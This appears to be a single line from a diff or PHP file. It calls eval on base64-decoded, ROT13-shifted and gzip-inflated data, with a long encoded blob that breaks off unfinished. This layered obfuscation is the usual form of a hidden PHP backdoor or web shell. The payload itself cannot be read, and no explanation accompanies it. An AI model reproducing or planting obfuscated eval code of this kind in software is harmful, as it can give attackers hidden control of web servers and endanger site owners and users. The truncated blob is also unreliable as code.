-<? eval(gzinflate(str_rot13(base64_decode(\'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